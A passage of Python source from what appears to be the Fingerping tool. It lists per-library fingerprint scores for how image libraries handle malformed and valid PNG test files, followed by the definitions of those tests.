                              {'black_white': 10, 'control_8bit_i': 10, 'Compression': 14, 'ihdr_too_long': 0, 'ihdr_height_0': 0, 'invalid_name_reserved_bit_ancillary_public_chunk_before_idat': 10, 'idat_bad_zlib_method': 0, 'truecolor_trns_chunk': 13, 'gamma_four_and_srgb': 14, 'truecolor_alpha_trns_chunk': 13, 'invalid_length_iend': 10, 'nonconsecutive_idat': 0, 'filters RGB': [0], 'ihdr_width_0': 0, 'unknown_critical_chunk_bad_checksum': 0, 'two_plte_chunk': 0, 'idat_bad_filter': 11, 'CESA-2004-001': 0, 'ihdr_widthheight0': 0, 'no_iend': 0, 'jng_file': 10, 'control_8bit': 10, 'transparent_truncated_palette': 10, 'filters indexed': [0], 'transparent_bkdred': 13, 'two_ihdr_chunk': 0, 'idat_too_much_data': 10, 'invalid_name_ancillary_public_chunk_before_idat': 0, 'idat_empty_zlib_object': 0, 'truncated_chunk': 0, 'png64': 10, 'idat_junk_after_lz': 0, 'invalid_iccp_2': 10, 'ihdr_not_first_chunk': 0, 'control_rgba': 10, 'chunk_with_number_in_name_before_idat': 0, 'first_idat_empty': 10, 'invalid_name_ancillary_public_chunk_before_idat_bad_checksum': 0, 'png48': 10, 'unknown_critical_chunk': 0, 'iend_before_idat': 0, 'invalid_iccp_1': 10, 'idat_bad_zlib_checksum': 0, 'modified_phys': 13, 'invalid_name_ancillary_private_chunk_before_idat': 0, 'mng_file': 10, 'grayscale_with_plte': 10, 'ihdr_too_short': 0, 'gamma_four_nosrgb': 13, 'junk_after_iend': 10, 'indexed_no_plte': 0, 'plte_after_idat': 0, 'ihdr_invalid_compression_method': 0, 'idat_bad_zlib_checkbits': 0, 'CVE-2014-0333': 10, 'ios_cgbl_chunk': 0, 'Checksums': 11, 'control_grayscale': 10, 'idat_zlib_invalid_window': 0, 'ihdr_invalid_filter_method': 0}),

        FingerpingFingerprint("ImageMagick 6.5.4-10 strip/size", "ImageMagick 6.5.4-10 2016-12-19 Q16, convert -strip command (but results showed that resizing with -size results in the same fingerprint)",
                              {'black_white': 10, 'control_8bit_i': 10, 'Compression': 14, 'ihdr_too_long': 0, 'ihdr_height_0': 0, 'invalid_name_reserved_bit_ancillary_public_chunk_before_idat': 10, 'idat_bad_zlib_method': 0, 'truecolor_trns_chunk': 11, 'gamma_four_and_srgb': 14, 'truecolor_alpha_trns_chunk': 11, 'invalid_length_iend': 10, 'nonconsecutive_idat': 0, 'filters RGB': [1, 2, 4], 'ihdr_width_0': 0, 'unknown_critical_chunk_bad_checksum': 0, 'two_plte_chunk': 0, 'idat_bad_filter': 11, 'CESA-2004-001': 0, 'ihdr_widthheight0': 0, 'no_iend': 0, 'jng_file': 10, 'control_8bit': 10, 'transparent_truncated_palette': 10, 'filters indexed': [0], 'transparent_bkdred': 11, 'two_ihdr_chunk': 0, 'idat_too_much_data': 10, 'invalid_name_ancillary_public_chunk_before_idat': 0, 'idat_empty_zlib_object': 0, 'truncated_chunk': 0, 'png64': 10, 'idat_junk_after_lz': 0, 'invalid_iccp_2': 10, 'ihdr_not_first_chunk': 0, 'control_rgba': 10, 'chunk_with_number_in_name_before_idat': 0, 'first_idat_empty': 10, 'invalid_name_ancillary_public_chunk_before_idat_bad_checksum': 0, 'png48': 10, 'unknown_critical_chunk': 0, 'iend_before_idat': 0, 'invalid_iccp_1': 10, 'idat_bad_zlib_checksum': 0, 'modified_phys': 13, 'invalid_name_ancillary_private_chunk_before_idat': 0, 'mng_file': 10, 'grayscale_with_plte': 10, 'ihdr_too_short': 0, 'gamma_four_nosrgb': 13, 'junk_after_iend': 10, 'indexed_no_plte': 0, 'plte_after_idat': 0, 'ihdr_invalid_compression_method': 0, 'idat_bad_zlib_checkbits': 0, 'CVE-2014-0333': 10, 'ios_cgbl_chunk': 0, 'Checksums': 11, 'control_grayscale': 10, 'idat_zlib_invalid_window': 0, 'ihdr_invalid_filter_method': 0}),

        FingerpingFingerprint("ImageMagick 6.5.4-10 resize", "ImageMagick 6.5.4-10 2016-12-19 Q16, convert -resize 50x50 command",
                              {'Compression': 14, 'two_plte_chunk': 0, 'modified_phys': 13, 'unknown_critical_chunk': 0, 'idat_bad_zlib_method': 0, 'transparent_bkdred': 11, 'unknown_critical_chunk_bad_checksum': 0, 'chunk_with_number_in_name_before_idat': 0, 'ihdr_too_long': 0, 'indexed_no_plte': 0, 'control_rgba': 10, 'ihdr_invalid_filter_method': 0, 'truncated_chunk': 0, 'ihdr_height_0': 0, 'ihdr_widthheight0': 0, 'two_ihdr_chunk': 0, 'filters indexed': [1, 2, 4], 'gamma_four_and_srgb': 0, 'junk_after_iend': 10, 'truecolor_trns_chunk': 11, 'control_8bit_i': 10, 'png48': 10, 'invalid_length_iend': 10, 'Checksums': 11, 'first_idat_empty': 10, 'idat_junk_after_lz': 0, 'ihdr_too_short': 0, 'truecolor_alpha_trns_chunk': 11, 'idat_empty_zlib_object': 0, 'control_grayscale': 10, 'idat_bad_zlib_checkbits': 0, 'CVE-2014-0333': 10, 'ihdr_width_0': 0, 'invalid_iccp_2': 10, 'invalid_iccp_1': 10, 'mng_file': 10, 'jng_file': 10, 'no_iend': 0, 'nonconsecutive_idat': 0, 'transparent_truncated_palette': 10, 'invalid_name_ancillary_public_chunk_before_idat_bad_checksum': 0, 'invalid_name_reserved_bit_ancillary_public_chunk_before_idat': 10, 'gamma_four_nosrgb': 0, 'ihdr_invalid_compression_method': 0, 'invalid_name_ancillary_public_chunk_before_idat': 0, 'CESA-2004-001': 0, 'idat_bad_filter': 13, 'control_8bit': 10, 'iend_before_idat': 0, 'ihdr_not_first_chunk': 0, 'idat_bad_zlib_checksum': 0, 'grayscale_with_plte': 10, 'plte_after_idat': 0, 'filters RGB': [1, 2, 4], 'invalid_name_ancillary_private_chunk_before_idat': 0, 'idat_too_much_data': 10, 'black_white': 10, 'ios_cgbl_chunk': 0, 'png64': 10, 'idat_zlib_invalid_window': 0}),

        FingerpingFingerprint("GraphicsMagick 1.3.26 strip", "GraphicsMagick 1.3.26 2017-07-04 Q8, gm mogrify -strip command",
                              {'black_white': 10, 'control_8bit_i': 10, 'Compression': 14, 'ihdr_too_long': 0, 'ihdr_height_0': 0, 'invalid_name_reserved_bit_ancillary_public_chunk_before_idat': 10, 'idat_bad_zlib_method': 0, 'truecolor_trns_chunk': 11, 'gamma_four_and_srgb': 14, 'truecolor_alpha_trns_chunk': 11, 'invalid_length_iend': 10, 'nonconsecutive_idat': 0, 'filters RGB': [1, 2, 4], 'ihdr_width_0': 0, 'unknown_critical_chunk_bad_checksum': 0, 'two_plte_chunk': 0, 'idat_bad_filter': 0, 'CESA-2004-001': 0, 'ihdr_widthheight0': 0, 'no_iend': 0, 'jng_file': 10, 'control_8bit': 10, 'transparent_truncated_palette': 0, 'filters indexed': [0], 'transparent_bkdred': 11, 'two_ihdr_chunk': 0, 'idat_too_much_data': 10, 'invalid_name_ancillary_public_chunk_before_idat': 0, 'idat_empty_zlib_object': 0, 'truncated_chunk': 0, 'png64': 10, 'idat_junk_after_lz': 10, 'invalid_iccp_2': 10, 'ihdr_not_first_chunk': 0, 'control_rgba': 10, 'chunk_with_number_in_name_before_idat': 0, 'first_idat_empty': 10, 'invalid_name_ancillary_public_chunk_before_idat_bad_checksum': 0, 'png48': 10, 'unknown_critical_chunk': 0, 'iend_before_idat': 0, 'invalid_iccp_1': 10, 'idat_bad_zlib_checksum': 0, 'modified_phys': 13, 'invalid_name_ancillary_private_chunk_before_idat': 0, 'mng_file': 10, 'grayscale_with_plte': 10, 'ihdr_too_short': 0, 'gamma_four_nosrgb': 13, 'junk_after_iend': 10, 'indexed_no_plte': 0, 'plte_after_idat': 0, 'ihdr_invalid_compression_method': 0, 'idat_bad_zlib_checkbits': 0, 'CVE-2014-0333': 10, 'ios_cgbl_chunk': 0, 'Checksums': 11, 'control_grayscale': 10, 'idat_zlib_invalid_window': 0, 'ihdr_invalid_filter_method': 0}),

        FingerpingFingerprint("OpenJDK 7", "OpenJDK Runtime Environment (IcedTea 2.3.9) (7u21-2.3.9-1ubuntu1)",
                              {'black_white': 10, 'control_8bit_i': 10, 'Compression': 14, 'ihdr_too_long': 0, 'ihdr_height_0': 0, 'invalid_name_reserved_bit_ancillary_public_chunk_before_idat': 10, 'idat_bad_zlib_method': 0, 'truecolor_trns_chunk': 12, 'gamma_four_and_srgb': 12, 'truecolor_alpha_trns_chunk': 11, 'invalid_length_iend': 10, 'nonconsecutive_idat': 0, 'filters RGB': [0], 'ihdr_width_0': 0, 'unknown_critical_chunk_bad_checksum': 10, 'two_plte_chunk': 0, 'idat_bad_filter': 0, 'CESA-2004-001': 0, 'ihdr_widthheight0': 0, 'no_iend': 10, 'jng_file': 0, 'control_8bit': 10, 'transparent_truncated_palette': 10, 'filters indexed': [1, 2, 3, 4], 'transparent_bkdred': 13, 'two_ihdr_chunk': 11, 'idat_too_much_data': 10, 'invalid_name_ancillary_public_chunk_before_idat': 10, 'idat_empty_zlib_object': 0, 'truncated_chunk': 10, 'png64': 10, 'idat_junk_after_lz': 10, 'invalid_iccp_2': 10, 'ihdr_not_first_chunk': 0, 'control_rgba': 10, 'chunk_with_number_in_name_before_idat': 10, 'first_idat_empty': 10, 'invalid_name_ancillary_public_chunk_before_idat_bad_checksum': 10, 'png48': 10, 'unknown_critical_chunk': 10, 'iend_before_idat': 10, 'invalid_iccp_1': 10, 'idat_bad_zlib_checksum': 0, 'modified_phys': 11, 'invalid_name_ancillary_private_chunk_before_idat': 10, 'mng_file': 0, 'grayscale_with_plte': 10, 'ihdr_too_short': 0, 'gamma_four_nosrgb': 12, 'junk_after_iend': 10, 'indexed_no_plte': 0, 'plte_after_idat': 0, 'ihdr_invalid_compression_method': 0, 'idat_bad_zlib_checkbits': 0, 'CVE-2014-0333': 10, 'ios_cgbl_chunk': 0, 'Checksums': 11, 'control_grayscale': 10, 'idat_zlib_invalid_window': 0, 'ihdr_invalid_filter_method': 0}),

        FingerpingFingerprint("LodePNG", "LodePNG 20140609",
                              {'black_white': 10, 'control_8bit_i': 10, 'Compression': 11, 'ihdr_too_long': 0, 'ihdr_height_0': 10, 'invalid_name_reserved_bit_ancillary_public_chunk_before_idat': 10, 'idat_bad_zlib_method': 0, 'truecolor_trns_chunk': 13, 'gamma_four_and_srgb': 12, 'truecolor_alpha_trns_chunk': 0, 'invalid_length_iend': 10, 'nonconsecutive_idat': 10, 'filters RGB': [0], 'ihdr_width_0': 0, 'unknown_critical_chunk_bad_checksum': 0, 'two_plte_chunk': 12, 'idat_bad_filter': 0, 'CESA-2004-001': 0, 'ihdr_widthheight0': 10, 'no_iend': 0, 'jng_file': 0, 'control_8bit': 10, 'transparent_truncated_palette': 0, 'filters indexed': [0], 'transparent_bkdred': 13, 'two_ihdr_chunk': 0, 'idat_too_much_data': 10, 'invalid_name_ancillary_public_chunk_before_idat': 10, 'idat_empty_zlib_object': 10, 'truncated_chunk': 0, 'png64': 10, 'idat_junk_after_lz': 0, 'invalid_iccp_2': 10, 'ihdr_not_first_chunk': 0, 'control_rgba': 10, 'chunk_with_number_in_name_before_idat': 10, 'first_idat_empty': 10, 'invalid_name_ancillary_public_chunk_before_idat_bad_checksum': 10, 'png48': 10, 'unknown_critical_chunk': 0, 'iend_before_idat': 0, 'invalid_iccp_1': 10, 'idat_bad_zlib_checksum': 0, 'modified_phys': 11, 'invalid_name_ancillary_private_chunk_before_idat': 10, 'mng_file': 0, 'grayscale_with_plte': 10, 'ihdr_too_short': 0, 'gamma_four_nosrgb': 12, 'junk_after_iend': 10, 'indexed_no_plte': 0, 'plte_after_idat': 10, 'ihdr_invalid_compression_method': 0, 'idat_bad_zlib_checkbits': 0, 'CVE-2014-0333': 10, 'ios_cgbl_chunk': 0, 'Checksums': 11, 'control_grayscale': 10, 'idat_zlib_invalid_window': 0, 'ihdr_invalid_filter_method': 0}),

        FingerpingFingerprint("Mono", "Mono JIT compiler version 2.10.8.1 (Debian 2.10.8.1-5ubuntu1)",
                              {'black_white': 4, 'control_8bit_i': 10, 'Compression': 13, 'ihdr_too_long': 0, 'ihdr_height_0': 0, 'invalid_name_reserved_bit_ancillary_public_chunk_before_idat': 10, 'idat_bad_zlib_method': 0, 'truecolor_trns_chunk': 12, 'gamma_four_and_srgb': 14, 'truecolor_alpha_trns_chunk': 11, 'invalid_length_iend': 10, 'nonconsecutive_idat': 0, 'filters RGB': [0], 'ihdr_width_0': 0, 'unknown_critical_chunk_bad_checksum': 0, 'two_plte_chunk': 0, 'idat_bad_filter': 11, 'CESA-2004-001': 0, 'ihdr_widthheight0': 0, 'no_iend': 0, 'jng_file': 0, 'control_8bit': 10, 'transparent_truncated_palette': 10, 'filters indexed': [0], 'transparent_bkdred': 12, 'two_ihdr_chunk': 0, 'idat_too_much_data': 10, 'invalid_name_ancillary_public_chunk_before_idat': 0, 'idat_empty_zlib_object': 0, 'truncated_chunk': 0, 'png64': 0, 'idat_junk_after_lz': 0, 'invalid_iccp_2': 10, 'ihdr_not_first_chunk': 0, 'control_rgba': 10, 'chunk_with_number_in_name_before_idat': 0, 'first_idat_empty': 10, 'invalid_name_ancillary_public_chunk_before_idat_bad_checksum': 0, 'png48': 0, 'unknown_critical_chunk': 0, 'iend_before_idat': 0, 'invalid_iccp_1': 10, 'idat_bad_zlib_checksum': 0, 'modified_phys': 11, 'invalid_name_ancillary_private_chunk_before_idat': 0, 'mng_file': 0, 'grayscale_with_plte': 10, 'ihdr_too_short': 0, 'gamma_four_nosrgb': 14, 'junk_after_iend': 10, 'indexed_no_plte': 0, 'plte_after_idat': 0, 'ihdr_invalid_compression_method': 0, 'idat_bad_zlib_checkbits': 0, 'CVE-2014-0333': 10, 'ios_cgbl_chunk': 0, 'Checksums': 11, 'control_grayscale': 10, 'idat_zlib_invalid_window': 0, 'ihdr_invalid_filter_method': 0}),

        FingerpingFingerprint("PHP5", "PHP 5.4.9-4ubuntu2.4 (cli) (built: Dec 12 2013 04:29:20)",
                              {'black_white': 4, 'control_8bit_i': 4, 'Compression': 13, 'ihdr_too_long': 0, 'ihdr_height_0': 0, 'invalid_name_reserved_bit_ancillary_public_chunk_before_idat': 10, 'idat_bad_zlib_method': 0, 'truecolor_trns_chunk': 13, 'gamma_four_and_srgb': 12, 'truecolor_alpha_trns_chunk': 12, 'invalid_length_iend': 10, 'nonconsecutive_idat': 0, 'filters RGB': [1, 2, 4], 'ihdr_width_0': 0, 'unknown_critical_chunk_bad_checksum': 0, 'two_plte_chunk': 0, 'idat_bad_filter': 11, 'CESA-2004-001': 0, 'ihdr_widthheight0': 0, 'no_iend': 0, 'jng_file': 0, 'control_8bit': 10, 'transparent_truncated_palette': 10, 'filters indexed': [0], 'transparent_bkdred': 13, 'two_ihdr_chunk': 0, 'idat_too_much_data': 10, 'invalid_name_ancillary_public_chunk_before_idat': 0, 'idat_empty_zlib_object': 0, 'truncated_chunk': 0, 'png64': 10, 'idat_junk_after_lz': 0, 'invalid_iccp_2': 10, 'ihdr_not_first_chunk': 0, 'control_rgba': 10, 'chunk_with_number_in_name_before_idat': 0, 'first_idat_empty': 10, 'invalid_name_ancillary_public_chunk_before_idat_bad_checksum': 0, 'png48': 10, 'unknown_critical_chunk': 0, 'iend_before_idat': 0, 'invalid_iccp_1': 10, 'idat_bad_zlib_checksum': 0, 'modified_phys': 11, 'invalid_name_ancillary_private_chunk_before_idat': 0, 'mng_file': 0, 'grayscale_with_plte': 10, 'ihdr_too_short': 0, 'gamma_four_nosrgb': 12, 'junk_after_iend': 10, 'indexed_no_plte': 0, 'plte_after_idat': 0, 'ihdr_invalid_compression_method': 0, 'idat_bad_zlib_checkbits': 0, 'CVE-2014-0333': 4, 'ios_cgbl_chunk': 0, 'Checksums': 11, 'control_grayscale': 10, 'idat_zlib_invalid_window': 0, 'ihdr_invalid_filter_method': 0}),

        FingerpingFingerprint("Nodejs pngjs", "Nodejs pngjs 0.4.0 https://github.com/niegowski/node-pngjs/",
                              {'black_white': 0, 'control_8bit_i': 0, 'Compression': 11, 'ihdr_too_long': 10, 'ihdr_height_0': 10, 'invalid_name_reserved_bit_ancillary_public_chunk_before_idat': 10, 'idat_bad_zlib_method': 0, 'truecolor_trns_chunk': 11, 'gamma_four_and_srgb': 12, 'truecolor_alpha_trns_chunk': 11, 'invalid_length_iend': 10, 'nonconsecutive_idat': 10, 'filters RGB': [4], 'ihdr_width_0': 10, 'unknown_critical_chunk_bad_checksum': 0, 'two_plte_chunk': 11, 'idat_bad_filter': 12, 'CESA-2004-001': 0, 'ihdr_widthheight0': 10, 'no_iend': 0, 'jng_file': 0, 'control_8bit': 10, 'transparent_truncated_palette': 0, 'filters indexed': [4], 'transparent_bkdred': 11, 'two_ihdr_chunk': 12, 'idat_too_much_data': 10, 'invalid_name_ancillary_public_chunk_before_idat': 10, 'idat_empty_zlib_object': 0, 'truncated_chunk': 10, 'png64': 0, 'idat_junk_after_lz': 10, 'invalid_iccp_2': 10, 'ihdr_not_first_chunk': 0, 'control_rgba': 10, 'chunk_with_number_in_name_before_idat': 10, 'first_idat_empty': 10, 'invalid_name_ancillary_public_chunk_before_idat_bad_checksum': 10, 'png48': 0, 'unknown_critical_chunk': 0, 'iend_before_idat': 0, 'invalid_iccp_1': 10, 'idat_bad_zlib_checksum': 0, 'modified_phys': 11, 'invalid_name_ancillary_private_chunk_before_idat': 10, 'mng_file': 0, 'grayscale_with_plte': 10, 'ihdr_too_short': 0, 'gamma_four_nosrgb': 12, 'junk_after_iend': 10, 'indexed_no_plte': 0, 'plte_after_idat': 0, 'ihdr_invalid_compression_method': 0, 'idat_bad_zlib_checkbits': 0, 'CVE-2014-0333': 0, 'ios_cgbl_chunk': 0, 'Checksums': 11, 'control_grayscale': 10, 'idat_zlib_invalid_window': 0, 'ihdr_invalid_filter_method': 0}),

        FingerpingFingerprint("Python PIL", "Python PIL 1.1.17",
                              {'black_white': 10, 'control_8bit_i': 10, 'Compression': 13, 'ihdr_too_long': 10, 'ihdr_height_0': 2, 'invalid_name_reserved_bit_ancillary_public_chunk_before_idat': 0, 'idat_bad_zlib_method': 0, 'truecolor_trns_chunk': 12, 'gamma_four_and_srgb': 12, 'truecolor_alpha_trns_chunk': 11, 'invalid_length_iend': 10, 'nonconsecutive_idat': 0, 'filters RGB': [1, 2, 4], 'ihdr_width_0': 0, 'unknown_critical_chunk_bad_checksum': 0, 'two_plte_chunk': 12, 'idat_bad_filter': 0, 'CESA-2004-001': 0, 'ihdr_widthheight0': 0, 'no_iend': 10, 'jng_file': 0, 'control_8bit': 10, 'transparent_truncated_palette': 10, 'filters indexed': [0], 'transparent_bkdred': 13, 'two_ihdr_chunk': 12, 'idat_too_much_data': 10, 'invalid_name_ancillary_public_chunk_before_idat': 0, 'idat_empty_zlib_object': 0, 'truncated_chunk': 10, 'png64': 10, 'idat_junk_after_lz': 10, 'invalid_iccp_2': 2, 'ihdr_not_first_chunk': 10, 'control_rgba': 10, 'chunk_with_number_in_name_before_idat': 10, 'first_idat_empty': 10, 'invalid_name_ancillary_public_chunk_before_idat_bad_checksum': 0, 'png48': 10, 'unknown_critical_chunk': 10, 'iend_before_idat': 0, 'invalid_iccp_1': 0, 'idat_bad_zlib_checksum': 0, 'modified_phys': 11, 'invalid_name_ancillary_private_chunk_before_idat': 0, 'mng_file': 0, 'grayscale_with_plte': 10, 'ihdr_too_short': 0, 'gamma_four_nosrgb': 12, 'junk_after_iend': 10, 'indexed_no_plte': 10, 'plte_after_idat': 10, 'ihdr_invalid_compression_method': 10, 'idat_bad_zlib_checkbits': 0, 'CVE-2014-0333': 10, 'ios_cgbl_chunk': 0, 'Checksums': 11, 'control_grayscale': 10, 'idat_zlib_invalid_window': 0, 'ihdr_invalid_filter_method': 0}),

        FingerpingFingerprint("Python png.py", "Python png.py http://pypng.googlecode.com/svn/trunk/code/png.py",
                              {'black_white': 4, 'control_8bit_i': 4, 'Compression': 13, 'ihdr_too_long': 0, 'ihdr_height_0': 0, 'invalid_name_reserved_bit_ancillary_public_chunk_before_idat': 0, 'idat_bad_zlib_method': 0, 'truecolor_trns_chunk': 13, 'gamma_four_and_srgb': 13, 'truecolor_alpha_trns_chunk': 0, 'invalid_length_iend': 10, 'nonconsecutive_idat': 10, 'filters RGB': [0], 'ihdr_width_0': 0, 'unknown_critical_chunk_bad_checksum': 0, 'two_plte_chunk': 12, 'idat_bad_filter': 0, 'CESA-2004-001': 0, 'ihdr_widthheight0': 0, 'no_iend': 0, 'jng_file': 0, 'control_8bit': 10, 'transparent_truncated_palette': 0, 'filters indexed': [0], 'transparent_bkdred': 0, 'two_ihdr_chunk': 12, 'idat_too_much_data': 10, 'invalid_name_ancillary_public_chunk_before_idat': 10, 'idat_empty_zlib_object': 4, 'truncated_chunk': 0, 'png64': 10, 'idat_junk_after_lz': 10, 'invalid_iccp_2': 10, 'ihdr_not_first_chunk': 10, 'control_rgba': 10, 'chunk_with_number_in_name_before_idat': 10, 'first_idat_empty': 10, 'invalid_name_ancillary_public_chunk_before_idat_bad_checksum': 0, 'png48': 10, 'unknown_critical_chunk': 10, 'iend_before_idat': 0, 'invalid_iccp_1': 10, 'idat_bad_zlib_checksum': 0, 'modified_phys': 11, 'invalid_name_ancillary_private_chunk_before_idat': 10, 'mng_file': 0, 'grayscale_with_plte': 0, 'ihdr_too_short': 0, 'gamma_four_nosrgb': 13, 'junk_after_iend': 10, 'indexed_no_plte': 4, 'plte_after_idat': 4, 'ihdr_invalid_compression_method': 0, 'idat_bad_zlib_checkbits': 0, 'CVE-2014-0333': 4, 'ios_cgbl_chunk': 0, 'Checksums': 11, 'control_grayscale': 10, 'idat_zlib_invalid_window': 0, 'ihdr_invalid_filter_method': 0}),

        FingerpingFingerprint("Ruby chunky_png", "Ruby chunky_png 1.3.1 https://rubygems.org/gems/chunky_png",
                              {'black_white': 10, 'control_8bit_i': 10, 'Compression': 13, 'ihdr_too_long': 10, 'ihdr_height_0': 0, 'invalid_name_reserved_bit_ancillary_public_chunk_before_idat': 0, 'idat_bad_zlib_method': 0, 'truecolor_trns_chunk': 13, 'gamma_four_and_srgb': 12, 'truecolor_alpha_trns_chunk': 13, 'invalid_length_iend': 0, 'nonconsecutive_idat': 10, 'filters RGB': [2], 'ihdr_width_0': 0, 'unknown_critical_chunk_bad_checksum': 0, 'two_plte_chunk': 12, 'idat_bad_filter': 0, 'CESA-2004-001': 0, 'ihdr_widthheight0': 0, 'no_iend': 10, 'jng_file': 0, 'control_8bit': 10, 'transparent_truncated_palette': 0, 'filters indexed': [2], 'transparent_bkdred': 13, 'two_ihdr_chunk': 12, 'idat_too_much_data': 10, 'invalid_name_ancillary_public_chunk_before_idat': 10, 'idat_empty_zlib_object': 0, 'truncated_chunk': 0, 'png64': 10, 'idat_junk_after_lz': 10, 'invalid_iccp_2': 10, 'ihdr_not_first_chunk': 10, 'control_rgba': 10, 'chunk_with_number_in_name_before_idat': 10, 'first_idat_empty': 0, 'invalid_name_ancillary_public_chunk_before_idat_bad_checksum': 0, 'png48': 10, 'unknown_critical_chunk': 10, 'iend_before_idat': 10, 'invalid_iccp_1': 10, 'idat_bad_zlib_checksum': 0, 'modified_phys': 11, 'invalid_name_ancillary_private_chunk_before_idat': 10, 'mng_file': 0, 'grayscale_with_plte': 10, 'ihdr_too_short': 10, 'gamma_four_nosrgb': 12, 'junk_after_iend': 0, 'indexed_no_plte': 0, 'plte_after_idat': 10, 'ihdr_invalid_compression_method': 10, 'idat_bad_zlib_checkbits': 0, 'CVE-2014-0333': 0, 'ios_cgbl_chunk': 0, 'Checksums': 11, 'control_grayscale': 10, 'idat_zlib_invalid_window': 0, 'ihdr_invalid_filter_method': 10})

    ]


class FingerpingTest:
    def __init__(self, name, filename, function, description):
        self.name = name
        self.filename = filename
        self.function = function
        self.description = description


class FingerpingTests:
    all_tests = [
        FingerpingTest("Checksums", "control", FingerpingXpng.correct_checksums, "Valid image, all libraries should be able to open it"),
        FingerpingTest("Compression", "control", FingerpingXpng.zlib_compression, "Test zlib compression level of output file"),
        FingerpingTest("filters RGB", "control", FingerpingXpng.filters_used, "Check which filters have been used in the reencoding"),
        FingerpingTest("filters indexed", "control_8bit", FingerpingXpng.filters_used, "Check which filters have been used in the reencoding"),
        FingerpingTest("control_8bit", "control_8bit", FingerpingXpng.conversion_success, "Valid paletted image"),
        FingerpingTest("control_8bit_i", "control_8bit_i", FingerpingXpng.conversion_success, "Valid paletted interlaced image"),
        FingerpingTest("control_grayscale", "control_grayscale", FingerpingXpng.conversion_success, "Valid grayscale image"),
        FingerpingTest("control_rgba", "control_rgba", FingerpingXpng.conversion_success, "Valid image with alpha"),
        FingerpingTest("CESA-2004-001", "CESA-2004-001", FingerpingXpng.conversion_success, "Invalid file triggering CESA-2004-001"),
        FingerpingTest("two_plte_chunk", "two_plte_chunk", FingerpingXpng.palette_used, "PNG file with two palettes, check which is used in result"),
        FingerpingTest("gamma_four_and_srgb", "gamma_four_and_srgb", FingerpingXpng.gamma,"PNG file with very high gamma, check if output is saturated"),
        FingerpingTest("gamma_four_nosrgb", "gamma_four_nosrgb", FingerpingXpng.gamma,"Test gamma of output image"),
        FingerpingTest("two_ihdr_chunk", "two_ihdr_chunk", FingerpingXpng.ihdr_used, "PNG image with two header chunks, check which is used"),
        FingerpingTest("idat_bad_filter", "idat_bad_filter", FingerpingXpng.bad_idat_filter, "Invalid scan line filter"),
        FingerpingTest("modified_phys", "modified_phys", FingerpingXpng.phys_chunk, "Check if decoder took phys into account"),
        FingerpingTest("truecolor_trns_chunk", "truecolor_trns_chunk", FingerpingXpng.truecolor_trns, ""),
        FingerpingTest("truecolor_alpha_trns_chunk", "truecolor_alpha_trns_chunk", FingerpingXpng.truecolor_trns, "truecolor + alpha image should not have a trns chunk"),
        FingerpingTest("transparent_bkdred", "transparent_bkdred", FingerpingXpng.truecolor_trns, ""),
        FingerpingTest("black_white", "black_white", FingerpingXpng.conversion_success, "Valid black & white image"),
        FingerpingTest("chunk_with_number_in_name_before_idat", "chunk_with_number_in_name_before_idat", FingerpingXpng.conversion_success, "Invalid chunk name"),
        FingerpingTest("CVE-2014-0333", "CVE-2014-0333", FingerpingXpng.conversion_success, ""),
        FingerpingTest("first_idat_empty", "first_idat_empty", FingerpingXpng.conversion_success, "valid file with first idat empty"),
        FingerpingTest("grayscale_with_plte", "grayscale_with_plte", FingerpingXpng.conversion_success, "Grayscale images should not have a plte chunk"),
        FingerpingTest("idat_bad_zlib_checkbits", "idat_bad_zlib_checkbits", FingerpingXpng.conversion_success, "invalid compressed data"),
        FingerpingTest("idat_bad_zlib_checksum", "idat_bad_zlib_checksum", FingerpingXpng.conversion_success, "invalid compressed data"),
        FingerpingTest("idat_bad_zlib_method", "idat_bad_zlib_method", FingerpingXpng.conversion_success, "invalid compressed data"),
        FingerpingTest("idat_empty_zlib_object", "idat_empty_zlib_object", FingerpingXpng.conversion_success, "invalid compressed data"),
        FingerpingTest("idat_junk_after_lz", "idat_junk_after_lz", FingerpingXpng.conversion_success, "Some junk appended to idat"),
        FingerpingTest("idat_too_much_data", "idat_too_much_data", FingerpingXpng.conversion_success, "too many scanlines in the compressed data"),
        FingerpingTest("idat_zlib_invalid_window", "idat_zlib_invalid_window", FingerpingXpng.conversion_success, "invalid compressed data"),
        FingerpingTest("iend_before_idat", "iend_before_idat", FingerpingXpng.conversion_success, "iend must be last chunk"),
        FingerpingTest("ihdr_height_0", "ihdr_height_0", FingerpingXpng.conversion_success, "invalid height"),
        FingerpingTest("ihdr_invalid_compression_method", "ihdr_invalid_compression_method", FingerpingXpng.conversion_success, "invalid ihdr"),
        FingerpingTest("ihdr_invalid_filter_method", "ihdr_invalid_filter_method", FingerpingXpng.conversion_success, "invalid ihdr"),
        FingerpingTest("ihdr_not_first_chunk", "ihdr_not_first_chunk", FingerpingXpng.conversion_success, "ihdr is not the first chunk"),
        FingerpingTest("ihdr_too_long", "ihdr_too_long", FingerpingXpng.conversion_success, "Invalid ihdr"),
        FingerpingTest("ihdr_too_short", "ihdr_too_short", FingerpingXpng.conversion_success, "Invalid ihdr"),
        FingerpingTest("ihdr_width_0", "ihdr_width_0", FingerpingXpng.conversion_success, "invalid width"),
        FingerpingTest("ihdr_widthheight0", "ihdr_widthheight0", FingerpingXpng.conversion_success, "invalid width and height"),
        FingerpingTest("indexed_no_plte", "indexed_no_plte", FingerpingXpng.conversion_success, "indexed png file missing the plte chunk"),
        FingerpingTest("invalid_iccp_1", "invalid_iccp_1", FingerpingXpng.conversion_success, "invalid iccp chunk"),
        FingerpingTest("invalid_iccp_2", "invalid_iccp_2", FingerpingXpng.conversion_success, "invalid iccp chunk"),
        FingerpingTest("invalid_length_iend", "invalid_length_iend", FingerpingXpng.conversion_success, "the length of the iend chunk should be zero"),
        FingerpingTest("invalid_name_ancillary_private_chunk_before_idat", "invalid_name_ancillary_private_chunk_before_idat", FingerpingXpng.conversion_success, "Invalid chunk name"),
        FingerpingTest("invalid_name_ancillary_public_chunk_before_idat_bad_checksum", "invalid_name_ancillary_public_chunk_before_idat_bad_checksum", FingerpingXpng.conversion_success, "invalid chunk name and invalid checksum"),
        FingerpingTest("invalid_name_ancillary_public_chunk_before_idat", "invalid_name_ancillary_public_chunk_before_idat", FingerpingXpng.conversion_success, "invalid chunk name"),
        FingerpingTest("invalid_name_reserved_bit_ancillary_public_chunk_before_idat", "invalid_name_reserved_bit_ancillary_public_chunk_before_idat", FingerpingXpng.conversion_success, "invalid chunk name"),
        FingerpingTest("ios_cgbl_chunk", "ios_cgbl_chunk", FingerpingXpng.conversion_success, "Apple png"),
        FingerpingTest("jng_file", "jng_file", FingerpingXpng.conversion_success, "jng file"),
